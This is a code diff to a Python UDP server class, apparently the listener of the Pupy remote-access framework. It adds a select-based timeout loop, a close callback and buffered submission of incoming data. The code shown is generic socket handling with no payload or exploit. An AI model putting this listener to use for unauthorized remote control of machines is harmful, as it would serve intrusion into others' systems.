@@ -11,6 +11,7 @@ from rpyc.core.stream import Stream
 from buffer import Buffer
 
 import socket
+import select
 import errno
 import random
 
@@ -221,7 +222,7 @@ class PupyUDPServer(object):
         self.service=service
 
         self.active=False
-        self.clients={}
+        self.clients = {}
         self.sock=None
         self.hostname=kwargs['hostname']
         self.port=kwargs['port']
@@ -245,22 +246,53 @@ class PupyUDPServer(object):
             except socket.error as msg:
                 s.close()
                 s = None
-                last_exc=msg
+                last_exc = msg
                 continue
             break
-        self.sock=s
+        self.sock = s
         if self.sock is None:
             raise last_exc
 
     def accept(self):
         try:
-            data, addr = self.sock.recvfrom(40960)
-            if data:
-                self.dispatch_data(data, addr)
-            else:
-                self.clients[addr].close()
+            minwait = None
+            now = None
+            unsent = False
+
+            for addr, client in self.clients.iteritems():
+                if not minwait:
+                    now = client.clock
+                    minwait = client.update_in(now)
+                else:
+                    cwait = client.update_in(now)
+                    if cwait < minwait:
+                        minwait = cwait
+
+                if client.unsent > 0:
+                    unsent = True
+
+            if minwait is not None:
+                minwait = minwait / 1000.0
+
+            if not unsent:
+                minwait = 1
+
+            r, _, _ = select.select([self.sock], [], [], minwait)
+            if r:
+                data, addr = self.sock.recvfrom(40960)
+                if data:
+                    self.dispatch_data(data, addr)
+                else:
+                    self.clients[addr].close()
+                    del self.clients[addr]
+
         except Exception as e:
             logging.error(e)
+            raise
+
+    def on_close(self, addr):
+        self.clients[addr].wake()
+        del self.clients[addr]
 
     def dispatch_data(self, data_received, addr):
         host, port=addr[0], addr[1]
@@ -274,8 +306,10 @@ class PupyUDPServer(object):
                 except AuthenticationError:
                     logging.info("failed to authenticate, rejecting data")
                     raise
+
             self.clients[addr] = self.stream_class(
-                (self.sock, addr), self.transport_class, self.transport_kwargs, client_side=False
+                (self.sock, addr), self.transport_class, self.transport_kwargs,
+                client_side=False, close_cb=self.on_close
             )
 
             t = PupyConnectionThread(
@@ -288,9 +322,8 @@ class PupyUDPServer(object):
             )
             t.daemon=True
             t.start()
-        with self.clients[addr].downstream_lock:
-            self.clients[addr].buf_in.write(data_received)
-            self.clients[addr].transport.downstream_recv(self.clients[addr].buf_in)
+
+        self.clients[addr].submit(data_received)
 
     def start(self):
         self.listen()
@@ -308,6 +341,6 @@ class PupyUDPServer(object):
             self.close()
 
     def close(self):
-        self.active=False
+        self.active = False
         if self.sock:
             self.sock.close()
